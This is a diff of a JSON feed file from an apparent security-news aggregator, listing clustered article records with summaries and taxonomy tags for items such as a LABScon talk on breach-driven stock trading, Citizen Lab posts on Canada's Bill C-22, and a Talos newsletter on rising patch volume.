+        "full_body": "LABScon LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout LABScon / May 14, 2026 When a company suffers a cyber breach, its stock price often takes a hit, but the timing, depth, and duration of that reaction are far less predictable. In this LABScon25 presentation, Mick Baccio and Scott Roberts explore whether public indicators of breach activity can be used to anticipate market response before formal disclosure. Drawing on sources such as EDGAR filings, executive blog posts, and social media chatter, the speakers examine how public breadcrumbs can reveal incident activity early enough to support an opportunistic trading strategy. At the center of the talk is their “15/30” hypothesis: short the stock after a breach becomes visible, then flip long as the market recovers. To test the idea, Baccio and Roberts used AI-assisted data collection to build a dataset of public disclosures relating to “material” cyber breaches at U.S. companies. They then compared their initial, intuition-led model with a more structured time-series analysis based on a Hidden Markov Model to see whether a more rigorous timeline could improve performance. Along the way, the presentation digs into real-world breach cases, market misreads, and missed opportunities. One particularly useful comparison looks at two similarly sized casino operators hit by ransomware around the same period, illustrating how market outcomes can diverge sharply depending on factors such as response strategy, disclosure dynamics, and investor perception. After working through a set of highly mixed results, the speakers arrive at what they call “quantitized nihilism”, a conclusion that questions many of the assumptions analysts bring to cyber-event trading and how the market actually values cyber failures. This talk is essential viewing for security practitioners, investors, and analysts interested in the messy intersection of cyber risk, public disclosure, and market psychology. <span data-mce-type=\"bookmark\" style=\"display: inline-block; width: 0px; overflow: hidden; line-height: 0;\" class=\"mce_SELRES_start\">﻿</span> About the Authors Mick Baccio is a globally recognized security strategist with a career spanning offensive operations, threat intelligence, and national-level incident response. He currently advises organizations around the world through his role at Splunk, helping security leaders improve operations through data-informed approaches. Mick was the first Chief Information Security Officer for a U.S. presidential campaign (2020), and previously served in the Obama White House as the Chief of the Threat Intelligence Branch. Scott J. Roberts is a cybersecurity leader with over 15 years of experience specializing in cyber threat intelligence and threat hunting after leadership roles at GitHub, Apple, and Splunk. He blends machine learning with traditional intelligence frameworks to track and disrupt nation state and criminal adversaries. LABScon 2026 | Call For Papers Submission Deadline: June 19, 2026 LABScon is a unique venue for original research to be shared among peers. The benefit of an invite-only audience of researchers is that there’s no need for long preambles or introductions – speakers are encouraged to dive right into their technical findings. Original content only. Talks are 20 minutes long + 5 minutes for Q&A. Workshops are 90 minutes long. LABScon is primarily a threat intelligence and vulnerability research conference but we keep an open-mind. About LABScon This presentation was featured live at LABScon 2025, an immersive 3-day conference bringing together the world’s top cybersecurity minds, hosted by SentinelOne’s research arm, SentinelLABS. Keep up with all the latest on LABScon here.",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware",
+            "nation_state"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "GitHub"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "threat_research",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SentinelOne Labs",
+          "cohort": "threat_research_primary",
+          "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
+          "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
+          "published": "2026-05-14T13:00:44+00:00",
+          "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware",
+              "nation_state"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "GitHub"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "threat_research",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "ad3165eb09",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government_public_sector"
+        ],
         "affected_products": [],
         "cve_ids": [],
         "attack_techniques": [],
@@ -7104,18 +6824,20 @@
         ]
       },
       "primary": {
-        "source": "SentinelOne Labs",
+        "source": "Citizen Lab",
         "cohort": "threat_research_primary",
-        "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
-        "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
-        "published": "2026-05-14T13:00:44+00:00",
-        "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
-        "full_body": "",
-        "fetch_status": "not_attempted",
+        "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
+        "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
+        "published": "2026-05-14T19:37:56+00:00",
+        "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
+        "full_body": "Date Published May 14, 2026 Topics Law & Policy bill c-22 Mentions Kate Robertson Share Canada’s proposed Bill C-22 could threaten encryption and privacy, say companies like Signal and Meta. Speaking with The Globe and Mail , senior research associate Kate Robertson says the bill could lead to the rollout of forced metadata collection for messaging apps. Robertson said that government officials were reticent to commit to protection for encryption. “Encrypted communication systems are a lifeline for human rights defenders, journalists, and dissidents around the world,” she said. Read the article More in: Law & Policy LATEST Our preliminary analysis of Bill C-2 situates the legislation within the context of existing research by the Citizen Lab about two potential data-sharing treaties that are most relevant to the new proposed powers being introduced in Bill C-2: the Second Additional Protocol to the Budapest Convention (2AP) and the CLOUD Act. Both of which carry significant constitutional and human rights risks. June 16, 2025 Law & Policy event Civil Society Summit on the AI Industry MAY 14, 2026 News + Updates → News Kill Bill C-22 Says Civil Society to Parliament APRIL 29, 2026 event [CANCELLED] Citizen Lab @ RightsCon APRIL 28, 2026",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
-          "affected_industries": [],
+          "affected_industries": [
+            "government_public_sector"
+          ],
           "affected_products": [],
           "cve_ids": [],
           "attack_techniques": [],
@@ -7127,20 +6849,107 @@
       },
       "corroborating_sources": [
         {
-          "source": "SentinelOne Labs",
+          "source": "Citizen Lab",
           "cohort": "threat_research_primary",
-          "title": "LABScon25 Replay | Breach Alpha: Trading on Cyber Fallout",
-          "link": "https://www.sentinelone.com/labs/labscon25-replay-breach-alpha-trading-on-cyber-fallout/",
-          "published": "2026-05-14T13:00:44+00:00",
-          "summary": "Mick Baccio and Scott Roberts examine whether public breach signals and market timing models can turn cyber incidents into actionable trading opportunities.",
+          "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
+          "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
+          "published": "2026-05-14T19:37:56+00:00",
+          "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
-            "affected_industries": [],
+            "affected_industries": [
+              "government_public_sector"
+            ],
             "affected_products": [],
             "cve_ids": [],
             "attack_techniques": [],
             "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_primary_research"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "34dacb9aa5",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "nation_state"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government_public_sector"
+        ],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [
+          "china"
+        ],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Citizen Lab",
+        "cohort": "threat_research_primary",
+        "title": "Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II",
+        "link": "https://citizenlab.ca/ron-deibert-speaks-at-the-osce-supplementary-human-dimension-meeting-ii/",
+        "published": "2026-05-13T17:36:53+00:00",
+        "summary": "Citizen Lab director Ron Deibert recently spoke at the OSCE Supplementary Human Dimension Meeting II on Safeguarding Civil Space in the Digital Age. The post Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II appeared first on The Citizen Lab .",
+        "full_body": "Date Published May 13, 2026 Topics Mass Surveillance Targeted Surveillance digital transnational repression , spyware Mentions Ron Deibert Share Citizen Lab director Ron Deibert recently spoke at the OSCE Supplementary Human Dimension Meeting II on Safeguarding Civil Space in the Digital Age. While the growth of the mercenary spyware industry is a major concern, Deibert noted that “spyware is only the sharp point of the spear in a massive, growing, and largely unregulated surveillance marketplace that is deeply anchored in the personal data surveillance economy.” He called for liberal democratic countries to resist using “national security or counterterrorism as an excuse to override oversight and public accountability.” Instead, “governments must put words into actions…to protect civil society and those most vulnerable to the spread of authoritarianism worldwide.” Watch More in: Mass Surveillance LATEST In collaboration with the International Consortium of Investigative Journalists (ICIJ), we identified two distinct actors aligned with the People’s Republic of China that have been targeting and impersonating journalists and civil society. Our findings provide insight into the Chinese government’s practice of digital transnational repression and its shift to a system of state-sponsored attacks carried out by private contractors. April 27, 2026 Digital Transnational Repression Targeted Surveillance News + Updates → Podcast Chilling Effects in the Digital Age APRIL 30, 2026 News + Updates → Podcast A New Study Shows How Ad-Based Technology is Used for Surveillance APRIL 29, 2026 event [CANCELLED] Citizen Lab @ RightsCon APRIL 28, 2026",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "nation_state"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "government_public_sector"
+          ],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [
+            "china"
+          ],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_primary_research"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Citizen Lab",
+          "cohort": "threat_research_primary",
+          "title": "Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II",
+          "link": "https://citizenlab.ca/ron-deibert-speaks-at-the-osce-supplementary-human-dimension-meeting-ii/",
+          "published": "2026-05-13T17:36:53+00:00",
+          "summary": "Citizen Lab director Ron Deibert recently spoke at the OSCE Supplementary Human Dimension Meeting II on Safeguarding Civil Space in the Digital Age. The post Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II appeared first on The Citizen Lab .",
+          "taxonomy": {
+            "threat_categories": [
+              "nation_state"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government_public_sector"
+            ],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [
+              "china"
+            ],
             "urgency_signals": [],
             "content_type": "uncategorized",
             "confidence_tier": "tier_1_primary_research"
@@ -7155,14 +6964,22 @@
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "active_exploitation",
+          "nation_state",
+          "ransomware"
+        ],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "Cisco"
+        ],
         "cve_ids": [],
         "attack_techniques": [],
         "geographic_scope": [],
-        "urgency_signals": [],
+        "urgency_signals": [
+          "actively_exploited"
+        ],
         "content_type": [
           "uncategorized"
         ],
@@ -7177,17 +6994,25 @@
         "link": "https://blog.talosintelligence.com/the-time-of-much-patching-is-coming/",
         "published": "2026-05-14T18:00:24+00:00",
         "summary": "In this week’s newsletter, Martin reflects on what the next iteration of AI tools means for vulnerability discovery and our ability to manage large-scale patch releases.",
-        "full_body": "",
-        "fetch_status": "not_attempted",
+        "full_body": "The time of much patching is coming By Martin Lee Thursday, May 14, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Many solutions have been proposed to reduce software bugs: zero-defect mandates, pair programming, formal methods, and mathematical software proofs. The reality is that software engineering is hard . Identifying and fixing bugs before they make it into production code is hard . Source code peer review and extensive unit testing have improved code quality, but bugs still get through. Not every bug is a vulnerability, and not every fault that appears to be a vulnerability can be usefully exploited. Nevertheless, through extensive testing and review, a skilled vulnerability researcher can still uncover faults in software that has already undergone rigorous quality assurance. However, skilled vulnerability researchers are a scarce resource and can only review so much software. AI is the great hope for improving software quality. Iterative improvements in AI's ability to find bugs mean that each new version of these systems is better than the last. We’re now at the point where AI, although still not as good as a skilled vulnerability researcher, can scan code to find errors at a scale and speed that human analysis cannot match. Used well, it can identify potential vulnerabilities before they reach production. In the long term, this is very good news. Better automated review and analysis of software is how we will improve code quality. However, in the short term, decades of technical debt and latent errors will be uncovered and will need to be addressed. To make things more complex, threat actors will have access to these same tools to search for exploitable vulnerabilities for their own ends. The result is likely to be a surge in patches. More vulnerabilities discovered means more fixes released, placing additional pressure on already stretched operations teams. Many of these patches will be urgent; some will address vulnerabilities that are being actively exploited. Without proper planning, the volume of fixes may outpace an organization's capacity to deploy them. The surge of patches has yet to happen, but the first signs may already be visible. Now is an excellent time to consider how you prioritise patching, apply patches at scale, and manage systems that cannot be patched quickly — or at all. We can reflect on these questions now, and improve our processes, or we can flounder when the surge of patches arrives. Either way, ready or not, the time of much patching is coming. The one big thing In Cisco Talos’ latest blog , we outline the differences between responding to state-sponsored threat actors and handling commodity ransomware. These advanced adversaries log in using valid credentials and leverage your own trusted tools to remain invisible for months. Because their primary objectives are long-term espionage and pre-positioning rather than immediate financial gain, standard incident response playbooks are entirely inadequate. Why do I care? State-sponsored actors operate inside your trust boundary and aim to remain completely undetected. They have the patience and resources to map your infrastructure, exploit supply chain vulnerabilities, and blend their lateral movement into routine administrative tasks. If your security architecture assumes internal traffic is inherently trustworthy, these adversaries will exploit that gap to establish deep, persistent access across both IT and operational technology environments. Prematurely containing these threats can even tip off the attacker, causing you to lose critical intelligence and the chance to fully eradicate their foothold. So now what? Shift to a zero trust architecture that continuously verifies access and plans for inevitable failures, starting with maximizing your visibility through centralized log aggregation and enabling Windows command-line and PowerShell script block logging. Prioritize identity managem",
+        "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "ransomware",
+            "active_exploitation",
+            "nation_state"
+          ],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [],
+          "affected_products": [
+            "Cisco"
+          ],
           "cve_ids": [],
           "attack_techniques": [],
           "geographic_scope": [],
-          "urgency_signals": [],
+          "urgency_signals": [
+            "actively_exploited"
+          ],
           "content_type": "uncategorized",
           "confidence_tier": "tier_1_primary_research"
         }
@@ -7201,14 +7026,22 @@
           "published": "2026-05-14T18:00:24+00:00",
           "summary": "In this week’s newsletter, Martin reflects on what the next iteration of AI tools means for vulnerability discovery and our ability to manage large-scale patch releases.",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "ransomware",
+              "active_exploitation",
+              "nation_state"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [],
+            "affected_products": [
+              "Cisco"
+            ],
             "cve_ids": [],
             "attack_techniques": [],
             "geographic_scope": [],
-            "urgency_signals": [],
+            "urgency_signals": [
+              "actively_exploited"
+            ],
             "content_type": "uncategorized",
             "confidence_tier": "tier_1_primary_research"
           }
@@ -7342,140 +7175,6 @@
             "threat_categories": [
               "vulnerability_disclosure"
             ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_primary_research"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "ad3165eb09",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Citizen Lab",
-        "cohort": "threat_research_primary",
-        "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
-        "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
-        "published": "2026-05-14T19:37:56+00:00",
-        "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_primary_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Citizen Lab",
-          "cohort": "threat_research_primary",
-          "title": "Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill",
-          "link": "https://citizenlab.ca/signal-warns-it-would-pull-out-of-canada-if-made-to-comply-with-lawful-access-bill/",
-          "published": "2026-05-14T19:37:56+00:00",
-          "summary": "Senior research associate Kate Robertson says Bill C-22 could lead to the rollout of forced metadata collection for messaging apps. The post Signal Warns It Would Pull Out of Canada if Made to Comply with Lawful Access Bill appeared first on The Citizen Lab .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_primary_research"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "34dacb9aa5",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [],
-        "content_type": [
-          "uncategorized"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Citizen Lab",
-        "cohort": "threat_research_primary",
-        "title": "Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II",
-        "link": "https://citizenlab.ca/ron-deibert-speaks-at-the-osce-supplementary-human-dimension-meeting-ii/",
-        "published": "2026-05-13T17:36:53+00:00",
-        "summary": "Citizen Lab director Ron Deibert recently spoke at the OSCE Supplementary Human Dimension Meeting II on Safeguarding Civil Space in the Digital Age. The post Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II appeared first on The Citizen Lab .",
-        "full_body": "",
-        "fetch_status": "not_attempted",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_primary_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Citizen Lab",
-          "cohort": "threat_research_primary",
-          "title": "Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II",
-          "link": "https://citizenlab.ca/ron-deibert-speaks-at-the-osce-supplementary-human-dimension-meeting-ii/",
-          "published": "2026-05-13T17:36:53+00:00",
-          "summary": "Citizen Lab director Ron Deibert recently spoke at the OSCE Supplementary Human Dimension Meeting II on Safeguarding Civil Space in the Digital Age. The post Ron Deibert Speaks at the OSCE: Supplementary Human Dimension Meeting II appeared first on The Citizen Lab .",
-          "taxonomy": {
-            "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
@@ -8503,6 +8202,307 @@
           }
         }
       ]
+    },
+    {
+      "cluster_id": "f25c2c1db7",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [
+          "ShinyHunters"
+        ],
+        "affected_industries": [],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_3_analysis"
+        ]
+      },
+      "primary": {
+        "source": "Risky Business News",
+        "cohort": "practitioner_analysis",
+        "title": "Risky Bulletin: FCC relaxes foreign router security patch ban",
+        "link": "https://risky.biz/RBNEWS562/",
+        "published": "2026-05-11T00:39:13+00:00",
+        "summary": "The FCC relaxes its foreign router ban to allow for security updates, the ShinyHunters group disrupts schools across the globe, a 21-year-old remote code execution bug turns up in FreeBSD, and another Linux privilege escalation bug was disclosed… without a patch.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [
+            "ShinyHunters"
+          ],
+          "affected_industries": [],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_3_analysis"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Risky Business News",
+          "cohort": "practitioner_analysis",
+          "title": "Risky Bulletin: FCC relaxes foreign router security patch ban",
+          "link": "https://risky.biz/RBNEWS562/",
+          "published": "2026-05-11T00:39:13+00:00",
+          "summary": "The FCC relaxes its foreign router ban to allow for security updates, the ShinyHunters group disrupts schools across the globe, a 21-year-old remote code execution bug turns up in FreeBSD, and another Linux privilege escalation bug was disclosed… without a patch.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [
+              "ShinyHunters"
+            ],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_3_analysis"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "9d6f88711e",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/cybersecurity",
+        "cohort": "reddit_practitioner_osint",
+        "title": "Microsoft warns of Exchange zero-day flaw exploited in attacks",
+        "link": "https://www.reddit.com/r/cybersecurity/comments/1tdvn3p/microsoft_warns_of_exchange_zeroday_flaw/",
+        "published": "2026-05-15T12:59:15+00:00",
+        "summary": "submitted by /u/rkhunter_ [link] [comments]",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_5_chatter"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/cybersecurity",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Microsoft warns of Exchange zero-day flaw exploited in attacks",
+          "link": "https://www.reddit.com/r/cybersecurity/comments/1tdvn3p/microsoft_warns_of_exchange_zeroday_flaw/",
+          "published": "2026-05-15T12:59:15+00:00",
+          "summary": "submitted by /u/rkhunter_ [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_5_chatter"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "b5a5a4af3b",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "malware",
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [
+          "zero_day"
+        ],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "Reddit r/msp",
+        "cohort": "reddit_practitioner_osint",
+        "title": "Microsoft BitLocker-protected drives can now be opened with just some files on a USB stick — YellowKey zero-day exploit demonstrates an apparent backdoor",
+        "link": "https://www.reddit.com/r/msp/comments/1td5hv6/microsoft_bitlockerprotected_drives_can_now_be/",
+        "published": "2026-05-14T17:42:31+00:00",
+        "summary": "submitted by /u/bagaudin [link] [comments]",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day",
+            "malware"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [
+            "zero_day"
+          ],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_5_chatter"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Reddit r/msp",
+          "cohort": "reddit_practitioner_osint",
+          "title": "Microsoft BitLocker-protected drives can now be opened with just some files on a USB stick — YellowKey zero-day exploit demonstrates an apparent backdoor",
+          "link": "https://www.reddit.com/r/msp/comments/1td5hv6/microsoft_bitlockerprotected_drives_can_now_be/",
+          "published": "2026-05-14T17:42:31+00:00",
+          "summary": "submitted by /u/bagaudin [link] [comments]",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day",
+              "malware"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [
+              "zero_day"
+            ],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_5_chatter"
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "afa0bd3b93",
+      "priority_score": 9,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "geographic_scope": [],
+        "urgency_signals": [],
+        "content_type": [
+          "uncategorized"
+        ],
+        "confidence_tier": [
+          "tier_1_government"
+        ]
+      },
+      "primary": {
+        "source": "NCSC UK",
+        "cohort": "government_authoritative",
+        "title": "10 questions to ask when using AI models to find vulnerabilities",
+        "link": "https://www.ncsc.gov.uk/blogs/10-questions-ask-using-ai-models-find-vulnerabilities",
+        "published": "2026-05-11T12:00:00+00:00",
+        "summary": "Using Artificial Intelligence to find vulnerabilities can bring added security considerations.",
+        "full_body": "",
+        "fetch_status": "not_attempted",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "geographic_scope": [],
+          "urgency_signals": [],
+          "content_type": "uncategorized",
+          "confidence_tier": "tier_1_government"
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "NCSC UK",
+          "cohort": "government_authoritative",
+          "title": "10 questions to ask when using AI models to find vulnerabilities",
+          "link": "https://www.ncsc.gov.uk/blogs/10-questions-ask-using-ai-models-find-vulnerabilities",
+          "published": "2026-05-11T12:00:00+00:00",
+          "summary": "Using Artificial Intelligence to find vulnerabilities can bring added security considerations.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "geographic_scope": [],
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_1_government"
+          }
+        }
+      ]
     }
   ],
   "affinity_groups": [
@@ -8549,6 +8549,47 @@
         "db4739da92",
         "e8d332d1ab",
         "d5f47a271d"
+      ]
+    },
+    {
+      "label": "malware targeting GitHub",
+      "dominant_features": {
+        "threat_categories": [
+          "malware",
+          "vulnerability_disclosure",
+          "nation_state"
+        ],
+        "affected_industries": [
+          "government_public_sector"
+        ],
+        "affected_products": [
+          "GitHub"
+        ],
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": [
+          "uncategorized",
+          "vulnerability_disclosure",
+          "threat_research"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "cluster_count": 9,
+      "article_count": 13,
+      "cohesion": 0.356,
+      "cluster_ids": [
+        "2eb9132451",
+        "029fcc1f63",
+        "e605f0e929",
+        "09f484b295",
+        "cf2449e818",
+        "55d60e5654",
+        "03647dbe9e",
+        "3da3cf9f20",
+        "34dacb9aa5"
       ]
     },
     {
@@ -8605,82 +8646,13 @@
       ]
     },
     {
